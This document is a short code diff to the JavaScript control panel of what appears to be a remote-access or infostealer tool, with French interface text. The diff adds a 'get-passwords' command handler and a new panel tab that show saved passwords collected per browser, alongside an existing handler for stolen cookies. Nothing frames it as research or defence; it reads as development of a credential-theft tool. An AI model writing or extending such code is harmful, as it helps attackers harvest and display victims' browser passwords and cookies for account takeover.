@@ -409,6 +409,13 @@ function connectToServer() {
       }
       document.getElementById('cookiesOutput').textContent = txt || 'Aucun cookie trouvé';
       showToast('🍪 Cookies récupérés');
+    } else if (cmd === 'get-passwords') {
+      let txt = '';
+      for (const [browser, val] of Object.entries(data)) {
+        txt += `── ${browser} ──\n${val}\n\n`;
+      }
+      document.getElementById('passwordsOutput').textContent = txt || 'Aucun mot de passe trouvé';
+      showToast('🔑 Mots de passe récupérés');
     } else {
       showToast(`✅ ${cmd}: ${typeof data === 'string' ? data : JSON.stringify(data)}`);
     }
@@ -434,7 +441,7 @@ window.toggleSidePanel = toggleSidePanel;
 
 function switchSpTab(tab) {
   spCurrentTab = tab;
-  ['info','macros','cookies'].forEach(t => {
+  ['info','macros','cookies','passwords'].forEach(t => {
     document.getElementById(`spTab${t.charAt(0).toUpperCase()+t.slice(1)}`).classList.toggle('active', t === tab);
     document.getElementById(`spBody${t.charAt(0).toUpperCase()+t.slice(1)}`).classList.toggle('hidden', t !== tab);
   });
